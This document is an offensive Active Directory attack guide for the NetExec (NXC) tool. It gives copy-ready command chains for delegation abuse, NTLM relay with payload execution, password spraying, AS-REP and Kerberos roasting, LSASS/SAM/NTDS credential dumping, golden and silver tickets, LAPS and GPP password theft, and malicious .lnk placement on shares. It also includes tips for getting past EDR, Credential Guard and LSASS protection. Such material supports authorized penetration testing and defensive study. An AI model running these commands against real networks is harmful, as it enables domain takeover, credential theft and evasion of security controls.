# Advanced NXC Techniques

## Delegation Abuse via NXC

Active Directory delegation allows services to impersonate users. Misconfigured delegation is a high-value attack path.

### Finding Unconstrained Delegation

Unconstrained delegation allows a service to impersonate any user to any service. If you compromise a host with unconstrained delegation, you can steal TGTs from any user that authenticates to it.

```bash
# Find accounts trusted for unconstrained delegation
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --trusted-for-delegation
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\jsmith:Password123
LDAP        192.168.1.10    389    DC01             [*] Accounts trusted for delegation:
LDAP        192.168.1.10    389    DC01             FILE01$                   TRUSTED_FOR_DELEGATION
LDAP        192.168.1.10    389    DC01             svc_iis                   TRUSTED_FOR_DELEGATION
```

**Attack chain:**
1. Compromise the unconstrained delegation host (FILE01)
2. Coerce a domain admin or DC to authenticate to it (e.g., via PetitPotam, PrinterBug)
3. Capture the TGT from memory (Rubeus monitor mode)
4. Use the TGT for PTT to achieve domain admin

```bash
# Step 1: Compromise FILE01
nxc smb 192.168.1.30 -u administrator -p 'Password123' -x 'whoami'

# Step 2: Coerce DC to authenticate to FILE01
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=192.168.1.30

# Step 3: Extract TGT from FILE01's memory (via Rubeus, not NXC directly)
# Step 4: Use captured TGT
export KRB5CCNAME=/tmp/dc01.ccache
nxc smb dc01.corp.local -k --use-kcache --ntds
```

### Finding Constrained Delegation

```bash
# Find accounts with constrained delegation
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --trusted-for-delegation
```

Constrained delegation limits which services a delegated account can access. However, if the `msds-allowedtodelegateto` attribute is set, you can request service tickets for those specific services as any user.

### Resource-Based Constrained Delegation (RBCD)

RBCD allows writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to configure delegation from a computer you control. NXC can be used to enumerate and exploit this.

```bash
# Enumerate who can modify computer objects (GenericWrite/GenericAll)
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --admin-count
```

---

## NTLM Relay Workflows with NXC

NXC integrates into NTLM relay attack chains by identifying targets and coercing authentication.

### Full Relay Attack Chain

```bash
# Step 1: Identify relay targets (SMB signing disabled)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Step 2: Set up relay infrastructure
# Terminal 1: Start ntlmrelayx
ntlmrelayx.py -tf relay_targets.txt -smb2support -i

# Terminal 2: Start Responder (disable SMB and HTTP servers)
responder -I eth0 -wrf

# Step 3: Coerce authentication via NXC
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5

# Step 4: ntlmrelayx relays the captured auth to signing-disabled hosts
# If the coerced account is admin on the relay target → shell
```

### Relay to LDAP (for RBCD or Shadow Credentials)

```bash
# Step 1: Find hosts with SMB signing disabled
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Step 2: Set up LDAP relay (ntlmrelayx with LDAP target)
ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access

# Step 3: Coerce authentication
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5

# Result: ntlmrelayx creates a computer account and sets RBCD, granting you access
```

### WebDAV Coercion

```bash
# Check for WebDAV on targets
nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' -M webdav

# WebDAV coercion allows relay even when SMB signing is required
# because WebDAV uses HTTP, not SMB
```

---

## Common Full Attack Chains

### Chain 1: Network Discovery → Password Spray → PTH → Domain Admin

This is the most common internal penetration test path:

```bash
# Phase 1: Discovery
nxc smb 192.168.1.0/24                                    # Find hosts, OS, signing status
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt          # Identify relay targets

# Phase 2: Initial Access
nxc smb 192.168.1.10 -u '' -p '' --users                  # Try null session for user list
nxc smb 192.168.1.10 -u '' -p '' --rid-brute               # RID brute if null session works
nxc smb 192.168.1.10 -u jsmith -p '' --pass-pol            # Get password policy
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success  # Spray

# Phase 3: Enumeration with Credentials
nxc smb 192.168.1.10 -u svc_sql -p 'Summer2024!' --shares  # Enumerate shares
nxc smb 192.168.1.10 -u svc_sql -p 'Summer2024!' --users --groups  # Users/groups
nxc smb 192.168.1.0/24 -u svc_sql -p 'Summer2024!'        # Check admin access

# Phase 4: Credential Theft
nxc smb 192.168.1.25 -u svc_sql -p 'Summer2024!' --sam     # Dump local hashes
nxc smb 192.168.1.25 -u svc_sql -p 'Summer2024!' -M lsassy # Dump LSASS

# Phase 5: Lateral Movement
nxc smb 192.168.1.0/24 -u admin.jones -H '<hash_from_lsassy>' # PTH everywhere
nxc smb 192.168.1.10 -u admin.jones -H '<hash>' --ntds     # DCSync if DA
```

### Chain 2: Null Session → User Enum → AS-REP Roast → Lateral Movement

When you start with no credentials:

```bash
# Phase 1: Unauthenticated Enumeration
nxc smb 192.168.1.10 -u '' -p '' --shares                 # Check null session shares
nxc smb 192.168.1.10 -u '' -p '' --rid-brute 10000        # Enumerate users via RID

# Phase 2: AS-REP Roasting (no password needed)
nxc ldap 192.168.1.10 -u users.txt -p '' --asreproast asrep.txt

# Phase 3: Crack AS-REP hashes offline
hashcat -m 18200 asrep.txt rockyou.txt

# Phase 4: Use cracked credentials
nxc smb 192.168.1.0/24 -u svc_legacy -p 'CrackedPass!'
nxc smb 192.168.1.0/24 -u svc_legacy -p 'CrackedPass!' --shares

# Phase 5: Kerberoast with valid credentials
nxc ldap 192.168.1.10 -u svc_legacy -p 'CrackedPass!' --kerberoasting krb.txt
hashcat -m 13100 krb.txt rockyou.txt

# Phase 6: Escalate with cracked service account
nxc smb 192.168.1.0/24 -u svc_sql -p 'CrackedSvcPass!' --sam --lsa
```

### Chain 3: SMB Signing Disabled → Coerce Auth → Relay → Shell

When SMB signing is disabled and you can coerce authentication:

```bash
# Phase 1: Find relay targets
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

# Phase 2: Set up relay (in separate terminal)
ntlmrelayx.py -tf relay.txt -smb2support -e /tmp/payload.exe

# Phase 3: Coerce authentication
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5

# Phase 4: ntlmrelayx catches the auth, relays it, executes payload
# Result: Shell on a signing-disabled host as the relayed user

# Phase 5: Post-exploitation from shell
nxc smb <compromised_host> -u administrator -H '<hash_from_relay>' --sam --lsa
```

### Chain 4: MSSQL Exploitation Path

```bash
# Phase 1: Find MSSQL servers
nxc mssql 192.168.1.0/24 -u jsmith -p 'Password123'

# Phase 2: Check for SA access
nxc mssql 192.168.1.25 -u sa -p 'sa' --local-auth
nxc mssql 192.168.1.25 -u sa -p '' --local-auth
nxc mssql 192.168.1.25 -u jsmith -p 'Password123'

# Phase 3: Execute commands via xp_cmdshell
nxc mssql 192.168.1.25 -u sa -p 'SQLPass!' -x 'whoami'
nxc mssql 192.168.1.25 -u sa -p 'SQLPass!' -x 'net localgroup administrators'

# Phase 4: Steal hashes via UNC path
nxc mssql 192.168.1.25 -u sa -p 'SQLPass!' -x "EXEC xp_dirtree '\\10.10.10.5\share'"
# Capture hash with Responder

# Phase 5: Check linked servers for pivoting
nxc mssql 192.168.1.25 -u sa -p 'SQLPass!' -q 'SELECT * FROM sys.servers'
```

---

## Kerberos Attacks in Depth

### Overpass-the-Hash

Convert an NTLM hash to a Kerberos ticket:

```bash
# Use NTLM hash to authenticate via Kerberos (avoids NTLM logging)
nxc smb dc01.corp.local -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' -k
```

This generates a legitimate Kerberos ticket from the NTLM hash, bypassing NTLM-specific monitoring.

### Golden Ticket Usage

After obtaining the krbtgt hash via DCSync:

```bash
# Step 1: DCSync to get krbtgt hash
nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds
# Extract krbtgt:502:...:b7a9c5b2c0d5e8f6a1b2c3d4e5f6a7b8:::

# Step 2: Create Golden Ticket (via Mimikatz/Rubeus, not NXC)
# ticketer.py -nthash b7a9c5b2c0d5e8f6a1b2c3d4e5f6a7b8 -domain-sid S-1-5-21-... -domain CORP.LOCAL Administrator

# Step 3: Use Golden Ticket with NXC
export KRB5CCNAME=/tmp/golden.ccache
nxc smb dc01.corp.local -k --use-kcache -x 'whoami'
```

### Silver Ticket Usage

```bash
# Step 1: Get a service account hash (from SAM/LSASS/NTDS)
# Step 2: Create Silver Ticket for specific service (via Mimikatz/Rubeus)
# Step 3: Use with NXC
export KRB5CCNAME=/tmp/silver.ccache
nxc smb file01.corp.local -k --use-kcache --shares
```

---

## Advanced Enumeration Techniques

### Finding Domain Admins' Active Sessions

```bash
# Find where domain admins are logged in (high-value targets)
nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --sessions --loggedon-users 2>/dev/null | grep -i "admin"
```

### Finding LAPS Passwords

```bash
# If you have rights to read LAPS passwords
nxc ldap 192.168.1.10 -u admin.jones -p 'Password123' -M laps
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\admin.jones:Password123
LDAP        192.168.1.10    389    DC01             [*] Getting LAPS Passwords
LDAP        192.168.1.10    389    DC01             WS01                 192.168.1.20        gT#8kL!pQ2nM     2024-06-15 10:30:00
LDAP        192.168.1.10    389    DC01             WS02                 192.168.1.21        xR&4mN@jF7bK     2024-06-15 10:30:00
```

### GPP Password Discovery

```bash
# Find Group Policy Preferences passwords
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M gpp_password
```

### Identifying Writable Shares for Slinky/SCF Attacks

```bash
# Find shares where you have WRITE access
nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --shares | grep "WRITE"

# Place a malicious .lnk file on writable shares
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M slinky -o SERVER=10.10.10.5 NAME=Q4_Report
```

---

## Edge Cases and Failure Modes

### When PTH Fails

- **UAC Remote Restrictions:** Non-RID-500 local admin accounts are filtered by UAC remotely. Set `LocalAccountTokenFilterPolicy=1` to bypass, or use the built-in Administrator (RID 500).
- **Credential Guard:** Prevents NTLM hash extraction from memory. PTH still works with hashes obtained elsewhere (e.g., NTDS dump).
- **Network-Level Restrictions:** Firewall or network segmentation blocking port 445.
- **Kerberos-Only Policy:** Environment enforces Kerberos, rejecting NTLM.

### When Kerberos Auth Fails

- **Clock Skew:** Kerberos requires <5 minute time difference between client and DC. Fix: `ntpdate dc01.corp.local`
- **DNS Resolution:** Kerberos requires hostname resolution. Fix: Add entries to `/etc/hosts` or configure DNS.
- **Expired Ticket:** .ccache ticket has expired. Fix: Re-request TGT.
- **Wrong Realm:** `/etc/krb5.conf` has wrong realm configuration.

### When Command Execution Fails

- **Endpoint Protection:** EDR blocks command execution (especially PowerShell).
  - Try different exec method: `--exec-method atexec`
  - Try cmd.exe instead of PowerShell: `-x` instead of `-X`
- **WMI Disabled:** Target has WMI disabled or firewall blocks DCOM ports.
  - Switch to smbexec: `--exec-method smbexec`
  - Try WinRM: `nxc winrm ...`
- **AppLocker/WDAC:** Application control blocks execution.
  - Try living-off-the-land binaries (LOLBins)

### When Credential Dumping Fails

- **RunAsPPL:** LSASS is protected as a Protected Process Light.
  - Use PPLdump or PPLFault to bypass (if kernel exploitable)
  - nanodump may bypass some PPL protections
- **Credential Guard:** Prevents hash storage in LSASS memory.
  - Hashes not available in LSASS; use DCSync instead
  - SAM dump still works (local accounts)
- **AV/EDR Blocks:** Security software blocks the dumping tool.
  - Try different lsassy methods: `-M lsassy -o METHOD=nanodump`
  - Use handlekatz module

---

## NXC vs CrackMapExec Command Differences

### Migration Reference

| Feature | CrackMapExec (CME) | NetExec (NXC) |
|---------|-------------------|---------------|
| Binary name | `crackmapexec` or `cme` | `nxc` |
| Config directory | `~/.cme/` | `~/.nxc/` |
| Database command | `cmedb` | `nxcdb` |
| Protocol support | smb, ldap, winrm, mssql, ssh | smb, ldap, winrm, rdp, ssh, ftp, mssql, vnc, wmi |
| Module system | `-M module` | `-M module` (same syntax) |
| Kerberos auth | `-k` | `-k` (same) |
| Pass-the-hash | `-H hash` | `-H hash` (same) |
| All other flags | Mostly identical | Mostly identical |

### New Features in NXC (Not in CME)

- Additional protocol modules: RDP, FTP, VNC, WMI
- Improved module system with more community modules
- Better error handling and output formatting
- Active maintenance and bug fixes
- RDP screenshot capability
- Improved LDAP enumeration options

### Removed/Changed in NXC

- Some older CME modules may not be ported
- Config file format may differ
- Database schema updates (nxcdb manages migration)
